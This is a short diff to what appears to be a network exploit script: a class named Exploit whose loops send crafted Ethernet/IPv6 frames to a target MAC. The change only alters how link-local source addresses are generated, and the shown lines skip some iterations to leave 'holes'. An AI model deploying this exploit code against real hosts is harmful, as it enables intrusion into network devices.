@@ -637,7 +637,7 @@ class Exploit():
                       end='\r',
                       flush=True)
 
-            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
+            source_ipv6 = 'fe80::0:0:0:{:04x}'.format(i)
 
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
@@ -720,7 +720,7 @@ class Exploit():
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                 continue
 
-            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
+            source_ipv6 = 'fe80::0:0:0:{:04x}'.format(i)
 
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
